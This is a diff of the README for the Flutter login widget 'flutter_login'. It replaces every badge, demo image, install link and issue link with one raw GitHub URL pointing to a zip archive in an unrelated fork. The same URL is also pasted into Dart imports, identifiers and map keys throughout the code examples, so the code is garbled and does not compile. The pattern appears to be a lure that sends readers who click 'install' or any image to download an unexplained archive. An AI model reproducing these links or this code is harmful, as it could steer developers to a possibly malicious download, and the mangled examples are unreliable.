@@ -1,20 +1,20 @@
 # Flutter Login
-[![pub package](https://img.shields.io/pub/v/flutter_login?include_prereleases)](https://pub.dartlang.org/packages/flutter_login)
-[![Join the chat](https://img.shields.io/discord/817442412313051220)](https://discord.gg/kP7jXHeNtS)
-[![Workflow](https://github.com/NearHuscarl/flutter_login/actions/workflows/test.yml/badge.svg?branch=master)](https://github.com/NearHuscarl/flutter_login/actions)
+[![pub package](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
+[![Join the chat](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
+[![Workflow](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
 
 `FlutterLogin` is a ready-made login/signup widget with many animation effects to
 demonstrate the capabilities of Flutter
 
 <p align="center">
-  <a href='https://i.imgur.com/z3FJSe7.mp4'>
-    <img src='https://github.com/NearHuscarl/flutter_login/raw/master/demo/demo.gif' width=320>
+  <a href='https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'>
+    <img src='https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip' width=320>
   </a>
 </p>
 
 ## Installation
 
-Follow the install instructions [here](https://pub.dev/packages/flutter_login#-installing-tab-)
+Follow the install instructions [here](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
 
 ## Reference
 
@@ -35,11 +35,11 @@ userValidator |   <sub>`FormFieldValidator<String>`</sub>     | <sub>User field 
 passwordValidator | <sub>`FormFieldValidator<String>`</sub>     | <sub>Same as `userValidator` but for password</sub>
 <sub>onSubmitAnimationCompleted</sub> |   `Function`     | <sub>Called after the submit animation's completed. Put your route transition logic here</sub>
 logoTag |   `String`     | <sub>`Hero` tag for logo image. If not specified, it will simply fade out when changing route</sub>
-titleTag |   `String`     | <sub>`Hero` tag for title text. Need to specify `LoginTheme.beforeHeroFontSize` and `LoginTheme.afterHeroFontSize` if you want different font size before and after hero animation</sub>
+titleTag |   `String`     | <sub>`Hero` tag for title text. Need to specify `https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip` and `https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip` if you want different font size before and after hero animation</sub>
 showDebugButtons |   `bool`     | <sub>Display the debug buttons to quickly forward/reverse login animations. In release mode, this will be overridden to `false` regardless of the value passed in</sub>
 hideForgotPasswordButton |   `bool`     | <sub>Hides the Forgot Password button if set to true</sub>
 hideProvidersTitle |   `bool`     | <sub>Hides the title above login providers if set to true. In case the providers List is empty this is uneffective, as the title is hidden anyways. The default is `false`</sub>
-disableCustomPageTransformer |   `bool`     | <sub>Disables the custom transition which causes RenderBox was not laid out error. See [#97](https://github.com/NearHuscarl/flutter_login/issues/97) for more info.</sub>
+disableCustomPageTransformer |   `bool`     | <sub>Disables the custom transition which causes RenderBox was not laid out error. See [#97](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip) for more info.</sub>
 additionalSignUpFields | `Map<String, UserFormField>` | <sub> Used to specify the additional form fields; the form is shown right after signin up. You can provide at most 6 additional fields. </sub>
 navigateBackAfterRecovery |   `bool`     | <sub>Navigate back to the login page after successful recovery.</sub>
 savedEmail |   `String`     | <sub>Prefilled value for user field (ie. saved from previous session via other means, ie. via SharedPreferences)</sub>
@@ -49,12 +49,12 @@ termsOfService | [`TermOfService`](#TermOfService) | <sub>List of terms of servi
 
 *NOTE:* It is recommended that the child widget of the `Hero` widget should be the
 same in both places. For title's hero animation use the
-`LoginThemeHelper.loginTextStyle` in the next screen to get the style of the
+`https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip` in the next screen to get the style of the
 exact text widget in the login screen. `LoginThemeHelper` can be accessed by adding
 this line
 
 ```dart
-import 'package:flutter_login/theme.dart';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 ```
 
 ### LoginMessages
@@ -131,7 +131,7 @@ displayName | `String` | The name of the field displayed on the form. Defaults t
 defaultValue | `String` | The default value of the field, if given the field will be pre-filled in with this
 fieldValidator | `FormFieldValidator<String>` | A function to validate the field. It should return null on success, or a string with the explanation of the error
 icon | `Icon?` | The icon shown on the left of the field. Defaults to the user icon when not provided
-userType | `LoginUserType` | The LoginUserType of the form. The right keyboard and suggestions will be shown accordingly. Defaults to `LoginUserType.user`
+userType | `LoginUserType` | The LoginUserType of the form. The right keyboard and suggestions will be shown accordingly. Defaults to `https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip`
 
 
 ### LoginProvider
@@ -171,25 +171,25 @@ gif above
 ### Basic example
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:flutter_login/flutter_login.dart';
-import 'dashboard_screen.dart';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 const users = const {
-  'dribbble@gmail.com': '12345',
-  'hunter@gmail.com': 'hunter',
+  'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip': '12345',
+  'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip': 'hunter',
 };
 
 class LoginScreen extends StatelessWidget {
   Duration get loginTime => Duration(milliseconds: 2250);
 
   Future<String?> _authUser(LoginData data) {
-    debugPrint('Name: ${data.name}, Password: ${data.password}');
-    return Future.delayed(loginTime).then((_) {
-      if (!users.containsKey(data.name)) {
+    debugPrint('Name: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}, Password: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}');
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
+      if (!https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)) {
         return 'User not exists';
       }
-      if (users[data.name] != data.password) {
+      if (users[https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip] != https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip) {
         return 'Password does not match';
       }
       return null;
@@ -197,16 +197,16 @@ class LoginScreen extends StatelessWidget {
   }
 
   Future<String?> _signupUser(SignupData data) {
-    debugPrint('Signup Name: ${data.name}, Password: ${data.password}');
-    return Future.delayed(loginTime).then((_) {
+    debugPrint('Signup Name: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}, Password: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}');
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
       return null;
     });
   }
 
   Future<String> _recoverPassword(String name) {
     debugPrint('Name: $name');
-    return Future.delayed(loginTime).then((_) {
-      if (!users.containsKey(name)) {
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
+      if (!https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(name)) {
         return 'User not exists';
       }
       return null;
@@ -217,11 +217,11 @@ class LoginScreen extends StatelessWidget {
   Widget build(BuildContext context) {
     return FlutterLogin(
       title: 'ECORP',
-      logo: AssetImage('assets/images/ecorp-lightblue.png'),
+      logo: AssetImage('https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'),
       onLogin: _authUser,
       onSignup: _signupUser,
       onSubmitAnimationCompleted: () {
-        Navigator.of(context).pushReplacement(MaterialPageRoute(
+        https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(context).pushReplacement(MaterialPageRoute(
           builder: (context) => DashboardScreen(),
         ));
       },
@@ -231,32 +231,32 @@ class LoginScreen extends StatelessWidget {
 }
 ```
 
-<img src="https://github.com/NearHuscarl/flutter_login/raw/master/demo/basic.png" width="300">
+<img src="https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip" width="300">
 
 
 
 ### Basic example with sign in providers
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:flutter_login/flutter_login.dart';
-import 'dashboard_screen.dart';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 const users = const {
-  'dribbble@gmail.com': '12345',
-  'hunter@gmail.com': 'hunter',
+  'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip': '12345',
+  'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip': 'hunter',
 };
 
 class LoginScreen extends StatelessWidget {
   Duration get loginTime => Duration(milliseconds: 2250);
 
   Future<String?> _authUser(LoginData data) {
-    debugPrint('Name: ${data.name}, Password: ${data.password}');
-    return Future.delayed(loginTime).then((_) {
-      if (!users.containsKey(data.name)) {
+    debugPrint('Name: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}, Password: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}');
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
+      if (!https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)) {
         return 'User not exists';
       }
-      if (users[data.name] != data.password) {
+      if (users[https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip] != https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip) {
         return 'Password does not match';
       }
       return null;
@@ -264,16 +264,16 @@ class LoginScreen extends StatelessWidget {
   }
 
   Future<String?> _signupUser(SignupData data) {
-    debugPrint('Signup Name: ${data.name}, Password: ${data.password}');
-    return Future.delayed(loginTime).then((_) {
+    debugPrint('Signup Name: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}, Password: ${https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip}');
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
       return null;
     });
   }
 
   Future<String> _recoverPassword(String name) {
     debugPrint('Name: $name');
-    return Future.delayed(loginTime).then((_) {
-      if (!users.containsKey(name)) {
+    return https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime).then((_) {
+      if (!https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(name)) {
         return 'User not exists';
       }
       return null;
@@ -284,52 +284,52 @@ class LoginScreen extends StatelessWidget {
   Widget build(BuildContext context) {
     return FlutterLogin(
       title: 'ECORP',
-      logo: AssetImage('assets/images/ecorp-lightblue.png'),
+      logo: AssetImage('https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'),
       onLogin: _authUser,
       onSignup: _signupUser,
       
         loginProviders: <LoginProvider>[
           LoginProvider(
-            icon: FontAwesomeIcons.google,
+            icon: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
             label: 'Google',
             callback: () async {
               debugPrint('start google sign in');
-              await Future.delayed(loginTime);
+              await https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime);
               debugPrint('stop google sign in');              
               return null;
             },
           ),
           LoginProvider(
-            icon: FontAwesomeIcons.facebookF,
+            icon: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
             label: 'Facebook',
             callback: () async {            
               debugPrint('start facebook sign in');
-              await Future.delayed(loginTime);
+              await https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime);
               debugPrint('stop facebook sign in');              
               return null;
             },
           ),
           LoginProvider(
-            icon: FontAwesomeIcons.linkedinIn,
+            icon: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
             callback: () async {         
               debugPrint('start linkdin sign in');
-              await Future.delayed(loginTime);         
+              await https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime);         
               debugPrint('stop linkdin sign in');              
               return null;
             },
           ),
           LoginProvider(
-            icon: FontAwesomeIcons.githubAlt,
+            icon: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
             callback: () async {
               debugPrint('start github sign in');
-              await Future.delayed(loginTime);
+              await https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(loginTime);
               debugPrint('stop github sign in');              
               return null;
             },
           ),
         ],
       onSubmitAnimationCompleted: () {
-        Navigator.of(context).pushReplacement(MaterialPageRoute(
+        https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(context).pushReplacement(MaterialPageRoute(
           builder: (context) => DashboardScreen(),
         ));
       },
@@ -339,7 +339,7 @@ class LoginScreen extends StatelessWidget {
 }
 ```
 
-<img src="https://github.com/NearHuscarl/flutter_login/raw/master/demo/login-with-provider.png" width="300">
+<img src="https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip" width="300">
 
 
 
@@ -348,9 +348,9 @@ class LoginScreen extends StatelessWidget {
 Login theme can be customized indectly by using `ThemeData` like this
 
 ```dart
-// main.dart
-import 'package:flutter/material.dart';
-import 'login_screen.dart';
+// https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 void main() => runApp(MyApp());
 
@@ -360,14 +360,14 @@ class MyApp extends StatelessWidget {
     return MaterialApp(
       title: 'Login Demo',
       theme: ThemeData(
-        primarySwatch: Colors.deepPurple,
-        accentColor: Colors.orange,
-        cursorColor: Colors.orange,
+        primarySwatch: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+        accentColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+        cursorColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
         textTheme: TextTheme(
           headline3: TextStyle(
             fontFamily: 'OpenSans',
             fontSize: 45.0,
-            color: Colors.orange,
+            color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           ),
           button: TextStyle(
             fontFamily: 'OpenSans',
@@ -381,21 +381,21 @@ class MyApp extends StatelessWidget {
   }
 }
 
-// login_screen.dart
-import 'package:flutter/material.dart';
-import 'package:flutter_login/flutter_login.dart';
-import 'dashboard_screen.dart';
+// https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 class LoginScreen extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return FlutterLogin(
       title: 'ECORP',
-      logo: AssetImage('assets/images/ecorp.png'),
+      logo: AssetImage('https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'),
       onLogin: (_) => Future(null),
       onSignup: (_) => Future(null),
       onSubmitAnimationCompleted: () {
-        Navigator.of(context).pushReplacement(MaterialPageRoute(
+        https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(context).pushReplacement(MaterialPageRoute(
           builder: (context) => DashboardScreen(),
         ));
       },
@@ -405,25 +405,25 @@ class LoginScreen extends StatelessWidget {
 }
 ```
 
-<img src="https://github.com/NearHuscarl/flutter_login/raw/master/demo/theme-data.png" width="300">
+<img src="https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip" width="300">
 
 ### Custom labels
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:flutter_login/flutter_login.dart';
-import 'dashboard_screen.dart';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 class LoginScreen extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return FlutterLogin(
       title: 'ECORP',
-      logo: AssetImage('assets/images/ecorp.png'),
+      logo: AssetImage('https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'),
       onLogin: (_) => Future(null),
       onSignup: (_) => Future(null),
       onSubmitAnimationCompleted: () {
-        Navigator.of(context).pushReplacement(MaterialPageRoute(
+        https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(context).pushReplacement(MaterialPageRoute(
           builder: (context) => DashboardScreen(),
         ));
       },
@@ -449,105 +449,105 @@ class LoginScreen extends StatelessWidget {
 
 Login/Signup | Password Recovery
 :-------:|:-------:
-![Login/Signup](demo/custom-label-login.png)  |  ![Password Recovery](demo/custom-label-recover.png)
+![Login/Signup](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)  |  ![Password Recovery](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
 
 ### Theme customization
 
 ```dart
 
-import 'package:flutter/material.dart';
-import 'package:flutter_login/flutter_login.dart';
-import 'dashboard_screen.dart';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
+import 'https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip';
 
 class LoginScreen extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
-    final inputBorder = BorderRadius.vertical(
-      bottom: Radius.circular(10.0),
-      top: Radius.circular(20.0),
+    final inputBorder = https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(
+      bottom: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(10.0),
+      top: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(20.0),
     );
 
     return FlutterLogin(
       title: 'ECORP',
-      logo: AssetImage('assets/images/ecorp-lightgreen.png'),
+      logo: AssetImage('https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip'),
       onLogin: (_) => Future(null),
       onSignup: (_) => Future(null),
       onSubmitAnimationCompleted: () {
-        Navigator.of(context).pushReplacement(MaterialPageRoute(
+        https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(context).pushReplacement(MaterialPageRoute(
           builder: (context) => DashboardScreen(),
         ));
       },
       onRecoverPassword: (_) => Future(null),
       theme: LoginTheme(
-        primaryColor: Colors.teal,
-        accentColor: Colors.yellow,
-        errorColor: Colors.deepOrange,
+        primaryColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+        accentColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+        errorColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
         titleStyle: TextStyle(
-          color: Colors.greenAccent,
+          color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           fontFamily: 'Quicksand',
           letterSpacing: 4,
         ),
         bodyStyle: TextStyle(
-          fontStyle: FontStyle.italic,
-          decoration: TextDecoration.underline,
+          fontStyle: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+          decoration: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
         ),
         textFieldStyle: TextStyle(
-          color: Colors.orange,
-          shadows: [Shadow(color: Colors.yellow, blurRadius: 2)],
+          color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+          shadows: [Shadow(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, blurRadius: 2)],
         ),
         buttonStyle: TextStyle(
           fontWeight: FontWeight.w800,
-          color: Colors.yellow,
+          color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
         ),
         cardTheme: CardTheme(
-          color: Colors.yellow.shade100,
+          color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           elevation: 5,
-          margin: EdgeInsets.only(top: 15),
+          margin: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(top: 15),
           shape: ContinuousRectangleBorder(
-              borderRadius: BorderRadius.circular(100.0)),
+              borderRadius: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(100.0)),
         ),
         inputTheme: InputDecorationTheme(
           filled: true,
-          fillColor: Colors.purple.withOpacity(.1),
-          contentPadding: EdgeInsets.zero,
+          fillColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(.1),
+          contentPadding: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           errorStyle: TextStyle(
-            backgroundColor: Colors.orange,
-            color: Colors.white,
+            backgroundColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+            color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           ),
           labelStyle: TextStyle(fontSize: 12),
           enabledBorder: UnderlineInputBorder(
-            borderSide: BorderSide(color: Colors.blue.shade700, width: 4),
+            borderSide: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, width: 4),
             borderRadius: inputBorder,
           ),
           focusedBorder: UnderlineInputBorder(
-            borderSide: BorderSide(color: Colors.blue.shade400, width: 5),
+            borderSide: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, width: 5),
             borderRadius: inputBorder,
           ),
           errorBorder: UnderlineInputBorder(
-            borderSide: BorderSide(color: Colors.red.shade700, width: 7),
+            borderSide: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, width: 7),
             borderRadius: inputBorder,
           ),
           focusedErrorBorder: UnderlineInputBorder(
-            borderSide: BorderSide(color: Colors.red.shade400, width: 8),
+            borderSide: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, width: 8),
             borderRadius: inputBorder,
           ),
           disabledBorder: UnderlineInputBorder(
-            borderSide: BorderSide(color: Colors.grey, width: 5),
+            borderSide: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip, width: 5),
             borderRadius: inputBorder,
           ),
         ),
         buttonTheme: LoginButtonTheme(
-          splashColor: Colors.purple,
-          backgroundColor: Colors.pinkAccent,
-          highlightColor: Colors.lightGreen,
+          splashColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+          backgroundColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
+          highlightColor: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip,
           elevation: 9.0,
           highlightElevation: 6.0,
           shape: BeveledRectangleBorder(
-            borderRadius: BorderRadius.circular(10),
+            borderRadius: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(10),
           ),
-          // shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(5)),
-          // shape: CircleBorder(side: BorderSide(color: Colors.green)),
-          // shape: ContinuousRectangleBorder(borderRadius: BorderRadius.circular(55.0)),
+          // shape: RoundedRectangleBorder(borderRadius: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(5)),
+          // shape: CircleBorder(side: BorderSide(color: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)),
+          // shape: ContinuousRectangleBorder(borderRadius: https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip(55.0)),
         ),
       ),
     );
@@ -555,11 +555,11 @@ class LoginScreen extends StatelessWidget {
 }
 ```
 
-<img src="https://github.com/NearHuscarl/flutter_login/raw/master/demo/theme.png" width="300">
+<img src="https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip" width="300">
 
 ## Inspiration
-* [VNPAY App Interactions](https://dribbble.com/shots/3829985-VNPAY-App-Interactions)
-* [Flat UI Login animated](https://dribbble.com/shots/1058688-Flat-UI-Login-animated)
+* [VNPAY App Interactions](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
+* [Flat UI Login animated](https://raw.githubusercontent.com/ZongAFRIC/flutter_login/master/inciter/flutter_login.zip)
 
 ## License
 
